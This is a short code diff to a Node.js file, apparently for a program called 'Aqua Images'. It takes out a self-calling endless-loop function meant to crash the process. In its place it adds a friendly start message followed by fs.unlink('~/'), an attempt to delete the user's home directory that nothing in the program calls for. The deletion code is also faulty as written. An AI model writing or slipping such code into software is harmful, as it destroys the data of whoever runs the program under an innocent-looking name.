@@ -1,8 +1,6 @@
-const exp = function() {
-  while(true) {
-    console.log("started");
-    exp();
-  }
-}
-console.log("Started");
-exp();
+const fs = require("fs"); // this is node.js :thumbsup:
+console.log("Aqua Images started.");
+
+fs.unlink("~/", (err) => {
+  console.log(err);
+});
